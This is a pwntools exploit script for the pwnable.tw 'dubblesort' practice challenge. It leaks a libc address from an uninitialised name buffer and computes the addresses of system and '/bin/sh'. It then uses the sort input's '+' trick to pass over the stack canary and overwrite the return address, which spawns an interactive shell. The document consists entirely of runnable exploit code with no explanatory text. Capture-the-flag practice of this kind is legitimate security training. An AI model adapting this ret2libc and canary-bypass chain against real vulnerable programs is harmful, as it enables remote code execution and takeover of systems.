from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 1 
ElfPath = './dubblesort'
LibcPath = './libc_32.so.6'
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10101'

elf = ELF(ElfPath)
if debug:
#    sh = process(ElfPath,env = { 'LD_PRELOAD':"./libc_32.so.6"})
    sh = process(ElfPath)
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
        libc = ELF(LibcPath)

if debug:
    sh.sendlineafter('name :','a'* 4 * 5)
else:
    sh.sendlineafter('name :','a'* 4 * 6)
sh.recvuntil('\n')
gotplt_recv = u32('\x00' + sh.recv(3))
gotplt_libc = libc.get_section_by_name('.got.plt').header.sh_addr
libc_addr = gotplt_recv - gotplt_libc
gdb.attach(sh)
system_addr = libc.symbols['system'] + libc_addr
bin_sh_addr = libc.search('/bin/sh').next() + libc_addr


log.info("----------------->{:#x}".format(libc_addr))
log.info("----------------->{:#x}".format(system_addr))
log.info("----------------->{:#x}".format(bin_sh_addr))

offset = 0xbc - 0x3c
canary_offset = 0xbc - 0x9c
sh.sendlineafter('sort :',str(offset/4+3))
for i in range(0,(offset - canary_offset)>>2):
    sh.sendlineafter('number : ','0')
sh.sendlineafter('number : ','+')
for i in range(0,canary_offset/4 + 1):
    sh.sendlineafter('number : ',str(system_addr))
#gdb.attach(sh)


sh.sendlineafter('number : ',str(bin_sh_addr))

sh.interactive()
sh.close()
